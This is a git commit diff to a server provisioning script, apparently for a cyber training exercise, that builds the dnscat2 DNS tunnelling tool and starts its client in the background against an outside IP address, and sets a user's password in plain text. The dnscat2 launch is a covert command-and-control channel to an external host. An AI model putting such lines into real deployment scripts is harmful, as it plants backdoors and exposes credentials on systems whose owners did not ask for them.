e9bc2dbaa92c9af5e04780b2e77b42432ed65202
GA-CyberWorkforceAcademy <43207128+GA-CyberWorkforceAcademy@users.noreply.github.com>
2020-01-23 13:21:17 -0500

    Update DMZ_server.sh

--- GTA2020/hostdata/DMZ_server.sh
+++ GTA2020/hostdata/DMZ_server.sh
@@ -44,10 +44,9 @@ apt-get update && apt-get install wazuh-agent -y
 git clone https://github.com/iagox86/dnscat2.git
 cd dnscat2/client/
 make
-## -- start dsncat2 client
-/dnscat2/client/dnscat --dns server=207.192.153.100 &
 ## --verify password for Sys Admin
 echo "Vanessa_Cohen:Y71N1" | chpasswd
+## -- start dsncat2 client
+/dnscat2/client/dnscat --dns server=207.192.153.100 &
 # --signals completion
 $signal_ms3_complete
-exit 1001
